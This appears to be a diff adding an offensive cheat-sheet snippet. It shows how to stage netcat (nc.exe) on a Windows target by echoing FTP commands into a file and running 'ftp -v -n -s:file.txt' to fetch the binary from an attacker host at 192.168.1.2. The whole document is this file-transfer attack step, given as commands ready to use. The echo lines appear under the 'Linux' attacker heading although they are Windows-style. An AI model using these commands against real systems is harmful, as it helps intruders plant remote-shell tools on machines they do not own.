@@ -1,0 +1,12 @@
+Linux System(Attacking machine)
+
+echo open 192.168.1.2 21> file.txt
+echo USER username>> file.txt
+echo password>> file.txt
+echo bin >> file.txt
+echo GET nc.exe >> file.txt
+echo bye >> file.txt
+
+Windows (Target machine)
+
+ftp -v -n -s:file.txt
